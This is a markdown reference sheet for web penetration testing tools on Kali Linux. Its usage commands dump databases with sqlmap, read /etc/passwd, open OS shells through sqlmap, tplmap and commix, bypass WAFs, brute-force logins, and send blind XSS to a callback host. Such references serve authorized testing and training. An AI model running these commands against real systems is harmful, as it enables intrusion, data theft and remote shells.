# SPIDER Tools Reference — Kali Linux

> *"The right tool for the right job. Every vulnerability has its weapon."*

## Web Vulnerability Scanners

### nikto
**Source**: https://github.com/sullo/nikto

```bash
# Basic scan
nikto -h http://$TARGET -o recon/nikto.txt

# With SSL
nikto -h https://$TARGET -ssl -o recon/nikto-ssl.txt

# Tuning (specific checks)
# 1=files, 2=misconfig, 3=info, 4=XSS, 5=remote file, 6=DOS, 7=remote shell, 8=SQLi, 9=upload
nikto -h http://$TARGET -Tuning 12345 -o recon/nikto.txt

# Full scan with all options
nikto -h http://$TARGET -C all -o recon/nikto-full.txt

# With authentication
nikto -h http://$TARGET -id admin:password -o recon/nikto-auth.txt
```

### wapiti
**Source**: https://github.com/wapiti-scanner/wapiti

```bash
# Basic scan
wapiti -u http://$TARGET -o wapiti_report

# Specific modules
wapiti -u http://$TARGET -m "sql,xss,exec" -o wapiti_report

# With authentication
wapiti -u http://$TARGET -a admin%password -o wapiti_report

# Full verbosity
wapiti -u http://$TARGET -v 2 -o wapiti_report
```

### nuclei
**Source**: https://github.com/projectdiscovery/nuclei

```bash
# All templates
nuclei -u http://$TARGET -o nuclei-all.txt

# Specific severity
nuclei -u http://$TARGET -s critical,high -o nuclei-critical.txt

# OWASP templates
nuclei -u http://$TARGET -t cves/ -t vulnerabilities/ -o nuclei-vulns.txt

# Technology-specific
nuclei -u http://$TARGET -t technologies/ -o nuclei-tech.txt

# Custom templates directory
nuclei -u http://$TARGET -t ~/custom-templates/ -o nuclei-custom.txt

# Rate limiting
nuclei -u http://$TARGET -rl 50 -o nuclei.txt

# Multiple URLs from file
nuclei -l urls.txt -o nuclei-bulk.txt
```

## SQL Injection

### sqlmap
**Source**: https://github.com/sqlmapproject/sqlmap

```bash
# Basic detection
sqlmap -u "http://$TARGET/page?id=1" --batch

# With forms (POST)
sqlmap -u "http://$TARGET/login" --data="user=admin&pass=test" --batch

# Enumerate databases
sqlmap -u "http://$TARGET/page?id=1" --dbs --batch

# Enumerate tables
sqlmap -u "http://$TARGET/page?id=1" -D database_name --tables --batch

# Dump table
sqlmap -u "http://$TARGET/page?id=1" -D database_name -T table_name --dump --batch

# OS shell (if writable)
sqlmap -u "http://$TARGET/page?id=1" --os-shell --batch

# SQL shell
sqlmap -u "http://$TARGET/page?id=1" --sql-shell --batch

# File read
sqlmap -u "http://$TARGET/page?id=1" --file-read="/etc/passwd" --batch

# Risk and level (higher = more tests)
sqlmap -u "http://$TARGET/page?id=1" --level=5 --risk=3 --batch

# Bypass WAF
sqlmap -u "http://$TARGET/page?id=1" --tamper=space2comment --batch

# With cookies
sqlmap -u "http://$TARGET/page?id=1" --cookie="PHPSESSID=xxx" --batch

# Use request file (from Burp)
sqlmap -r request.txt --batch

# Time-based blind
sqlmap -u "http://$TARGET/page?id=1" --technique=T --batch
```

## Cross-Site Scripting (XSS)

### dalfox
**Source**: https://github.com/hahwul/dalfox

```bash
# Single URL
dalfox url "http://$TARGET/page?param=test"

# From file
dalfox file urls.txt

# Pipeline mode
cat urls.txt | dalfox pipe

# With payload
dalfox url "http://$TARGET/page?param=test" -p "<script>alert(1)</script>"

# Blind XSS
dalfox url "http://$TARGET/page?param=test" --blind "https://your-callback.com"

# WAF bypass
dalfox url "http://$TARGET/page?param=test" --waf-evasion
```

### XSStrike
**Source**: https://github.com/s0md3v/XSStrike

```bash
# Basic scan
python3 xsstrike.py -u "http://$TARGET/page?param=test"

# With headers
python3 xsstrike.py -u "http://$TARGET/page?param=test" --headers "Cookie: xxx"

# POST data
python3 xsstrike.py -u "http://$TARGET/page" --data "param=test"

# Crawl mode
python3 xsstrike.py -u "http://$TARGET" --crawl
```

## Directory and File Discovery

### ffuf
**Source**: https://github.com/ffuf/ffuf

```bash
# Directory discovery
ffuf -u http://$TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -o web/ffuf-dirs.json

# File discovery with extensions
ffuf -u http://$TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.bak,.old -o web/ffuf-files.json

# Parameter fuzzing
ffuf -u "http://$TARGET/page?FUZZ=test" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt

# POST parameter fuzzing
ffuf -u http://$TARGET/login -X POST -d "username=admin&password=FUZZ" -w /usr/share/wordlists/rockyou.txt

# Header fuzzing
ffuf -u http://$TARGET -H "X-Custom-Header: FUZZ" -w wordlist.txt

# Virtual host discovery
ffuf -u http://$TARGET -H "Host: FUZZ.$DOMAIN" -w subdomains.txt -fs <filter_size>

# Filter by status code
ffuf -u http://$TARGET/FUZZ -w wordlist.txt -fc 404,403

# Filter by size
ffuf -u http://$TARGET/FUZZ -w wordlist.txt -fs 0

# Filter by words
ffuf -u http://$TARGET/FUZZ -w wordlist.txt -fw 100

# Recursive
ffuf -u http://$TARGET/FUZZ -w wordlist.txt -recursion -recursion-depth 2

# Rate limiting
ffuf -u http://$TARGET/FUZZ -w wordlist.txt -rate 50
```

### gobuster
**Source**: https://github.com/OJ/gobuster

```bash
# Directory mode
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -o web/gobuster.txt

# With extensions
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -o web/gobuster-ext.txt

# With cookies
gobuster dir -u http://$TARGET -w wordlist.txt -c "session=xxx"

# Follow redirects
gobuster dir -u http://$TARGET -w wordlist.txt -r

# DNS mode
gobuster dns -d $DOMAIN -w subdomains.txt

# Vhost mode
gobuster vhost -u http://$TARGET -w subdomains.txt
```

### wfuzz
**Source**: https://github.com/xmendez/wfuzz

```bash
# Directory fuzzing
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://$TARGET/FUZZ

# Hide 404
wfuzz -c -z file,wordlist.txt --hc 404 http://$TARGET/FUZZ

# POST fuzzing
wfuzz -c -z file,wordlist.txt -d "param=FUZZ" http://$TARGET/login

# Multiple positions
wfuzz -c -z file,users.txt -z file,passwords.txt http://$TARGET/login?user=FUZZ&pass=FUZ2Z

# Cookie fuzzing
wfuzz -c -z file,wordlist.txt -b "session=FUZZ" http://$TARGET/admin
```

## Parameter Discovery

### arjun
**Source**: https://github.com/s0md3v/Arjun

```bash
# GET parameters
arjun -u http://$TARGET/page

# POST parameters
arjun -u http://$TARGET/page -m POST

# JSON parameters
arjun -u http://$TARGET/api -m JSON

# With headers
arjun -u http://$TARGET/page --headers "Cookie: xxx"

# Output to file
arjun -u http://$TARGET/page -oJ params.json
```

### paramspider
**Source**: https://github.com/devanshbatham/ParamSpider

```bash
# Find parameters from web archives
paramspider -d $DOMAIN

# Output file
paramspider -d $DOMAIN -o params.txt

# With placeholder
paramspider -d $DOMAIN -p "FUZZ"
```

## URL Discovery

### gau (Get All URLs)
**Source**: https://github.com/lc/gau

```bash
# Get all URLs
gau $DOMAIN

# Output to file
gau $DOMAIN -o urls.txt

# With provider selection
gau --providers wayback,commoncrawl $DOMAIN
```

### waybackurls
**Source**: https://github.com/tomnomnom/waybackurls

```bash
# Get URLs from Wayback Machine
waybackurls $DOMAIN > wayback-urls.txt

# Filter for interesting extensions
waybackurls $DOMAIN | grep -E '\.(php|asp|aspx|jsp|json|xml)$'
```

### katana
**Source**: https://github.com/projectdiscovery/katana

```bash
# Crawl website
katana -u http://$TARGET -o crawl.txt

# With depth
katana -u http://$TARGET -d 3 -o crawl.txt

# JavaScript crawling
katana -u http://$TARGET -jc -o crawl.txt

# Headless mode
katana -u http://$TARGET -hl -o crawl.txt
```

## Server-Side Template Injection (SSTI)

### tplmap
**Source**: https://github.com/epinna/tplmap

```bash
# Test for SSTI
python3 tplmap.py -u "http://$TARGET/page?param=*"

# With POST
python3 tplmap.py -u http://$TARGET/page -d "param=*"

# OS command execution
python3 tplmap.py -u "http://$TARGET/page?param=*" --os-cmd "whoami"

# Interactive shell
python3 tplmap.py -u "http://$TARGET/page?param=*" --os-shell
```

## Command Injection

### commix
**Source**: https://github.com/commixproject/commix

```bash
# Basic test
commix -u "http://$TARGET/page?cmd=test"

# POST request
commix -u http://$TARGET/page --data="cmd=test"

# OS shell
commix -u "http://$TARGET/page?cmd=test" --os-cmd="whoami"

# Interactive shell
commix -u "http://$TARGET/page?cmd=test" --os-shell

# From Burp request
commix -r request.txt
```

## Proxy Tools

### Burp Suite
```bash
# Start Burp Suite
burpsuite

# Common workflow:
# 1. Configure browser proxy to 127.0.0.1:8080
# 2. Add target to scope
# 3. Spider/crawl the application
# 4. Review sitemap
# 5. Test with Repeater
# 6. Run Scanner (Pro)
```

### OWASP ZAP
```bash
# Start ZAP
zaproxy

# CLI scanning
zap-cli quick-scan http://$TARGET

# Full scan
zap-cli active-scan http://$TARGET

# Generate report
zap-cli report -o zap_report.html -f html
```

### mitmproxy
```bash
# Start mitmproxy
mitmproxy -p 8080

# Dump mode
mitmdump -w traffic.mitm

# Replay traffic
mitmdump -r traffic.mitm
```

## Quick Testing Commands

```bash
# Quick SQLi test
sqlmap -u "http://$TARGET/page?id=1" --batch --dbs

# Quick XSS test
dalfox url "http://$TARGET/page?param=test" --waf-evasion

# Quick directory scan
ffuf -u http://$TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404

# Quick vuln scan
nuclei -u http://$TARGET -s critical,high

# One-liner recon
echo $TARGET | waybackurls | grep -E '\?' | qsreplace "FUZZ" | xargs -I{} dalfox url {}
```

## Output Organization

```bash
# Create web testing directory
mkdir -p web/{scans,findings,evidence,payloads}

# Save all outputs
nikto -h http://$TARGET -o web/scans/nikto.txt
nuclei -u http://$TARGET -o web/scans/nuclei.txt
sqlmap -u "http://$TARGET/page?id=1" --batch --output-dir=web/scans/sqlmap
```
